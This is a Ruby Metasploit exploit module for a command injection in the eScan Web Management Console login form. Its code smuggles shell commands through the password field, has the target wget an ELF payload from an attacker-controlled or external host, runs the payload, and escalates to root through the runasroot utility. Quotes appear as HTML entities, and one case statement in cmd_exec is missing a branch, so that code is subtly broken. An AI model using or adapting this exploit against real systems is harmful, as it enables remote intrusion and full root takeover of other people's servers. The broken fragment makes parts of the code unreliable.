# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "eScan Web Management Console Command Injection",
      &#039;Description&#039;    => %q{
        This module exploits a command injection vulnerability found in the eScan Web Management
        Console. The vulnerability exists while processing CheckPass login requests. An attacker
        with a valid username can use a malformed password to execute arbitrary commands. With
        mwconf privileges, the runasroot utility can be abused to get root privileges. This module
        has been tested successfully on eScan 5.5-2 on Ubuntu 12.04.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Joxean Koret&#039;, # Vulnerability Discovery and PoC
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://www.joxeankoret.com/download/breaking_av_software-pdf.tar.gz&#039; ] # Syscan slides by Joxean
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;    => "", # Real bad chars when injecting: "|&)(!><&#039;\"` ", cause of it we&#039;re avoiding ARCH_CMD
          &#039;DisableNops&#039; => true
        },
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
      &#039;Targets&#039;        =>
        [
          [&#039;eScan 5.5-2 / Linux&#039;, {}],
        ],
      &#039;DisclosureDate&#039; => "Apr 04 2014",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        Opt::RPORT(10080),
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;A valid eScan username&#039; ]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the eScan Web Administration console&#039;, &#039;/&#039;]),
        OptString.new(&#039;EXTURL&#039;, [ false, &#039;An alternative host to request the EXE payload from&#039; ]),
        OptInt.new(&#039;HTTPDELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the payload request&#039;, 10]),
        OptString.new(&#039;WRITABLEDIR&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ]),
        OptString.new(&#039;RUNASROOT&#039;, [ true, &#039;Path to the runasroot binary&#039;, &#039;/opt/MicroWorld/sbin/runasroot&#039; ]),
      ], self.class)
  end


  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path.to_s, &#039;index.php&#039;)
    })

    if res and res.code == 200 and res.body =~ /eScan WebAdmin/
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Unknown
  end

  def cmd_exec(session, cmd)
    case session.type
      print_warning("#{peer} - Use a shell payload in order to get root!")
    when /shell/
      o = session.shell_command_token(cmd)
      o.chomp! if o
    end
    return "" if o.nil?
    return o
  end

  # Escalating privileges here because runasroot only can&#039;t be executed by
  # mwconf uid (196).
  def on_new_session(session)
    cmd_exec(session, "#{datastore[&#039;RUNASROOT&#039;].shellescape} /bin/sh")
    super
  end

  def primer
    @payload_url = get_uri
    wget_payload
  end

  def on_request_uri(cli, request)
    print_status("Request: #{request.uri}")
    if request.uri =~ /#{Regexp.escape(get_resource)}/
      print_status("Sending payload...")
      send_response(cli, @pl)
    end
  end

  def exploit
    @pl           = generate_payload_exe
    if @pl.blank?
      fail_with(Failure::BadConfig, "#{peer} - Failed to generate the ELF, select a native payload")
    end
    @payload_url  = ""

    if datastore[&#039;EXTURL&#039;].blank?
      begin
        Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) {super}
      rescue Timeout::Error
      end
      exec_payload
    else
      @payload_url = datastore[&#039;EXTURL&#039;]
      wget_payload
      exec_payload
    end
  end

  # we execute in this way, instead of an ARCH_CMD
  # payload because real badchars are: |&)(!><&#039;"`[space]
  def wget_payload
    @dropped_elf = rand_text_alpha(rand(5) + 3)
    command = "wget${IFS}#{@payload_url}${IFS}-O${IFS}#{File.join(datastore[&#039;WRITABLEDIR&#039;], @dropped_elf)}"

    print_status("#{peer} - Downloading the payload to the target machine...")
    res = exec_command(command)
    if res && res.code == 302 && res.headers[&#039;Location&#039;] && res.headers[&#039;Location&#039;] =~ /index\.php\?err_msg=password/
      register_files_for_cleanup(File.join(datastore[&#039;WRITABLEDIR&#039;], @dropped_elf))
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to download the payload to the target")
    end
  end

  def exec_payload
    command = "chmod${IFS}777${IFS}#{File.join(datastore[&#039;WRITABLEDIR&#039;], @dropped_elf)};"
    command << File.join(datastore[&#039;WRITABLEDIR&#039;], @dropped_elf)

    print_status("#{peer} - Executing the payload...")
    exec_command(command, 1)
  end

  def exec_command(command, timeout=20)
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path.to_s, &#039;login.php&#039;),
      &#039;vars_post&#039; => {
        &#039;uname&#039; => datastore[&#039;USERNAME&#039;],
        &#039;pass&#039; => ";#{command}",
        &#039;product_name&#039; => &#039;escan&#039;,
        &#039;language&#039; => &#039;English&#039;,
        &#039;login&#039; => &#039;Login&#039;
      }
    }, timeout)
  end

end

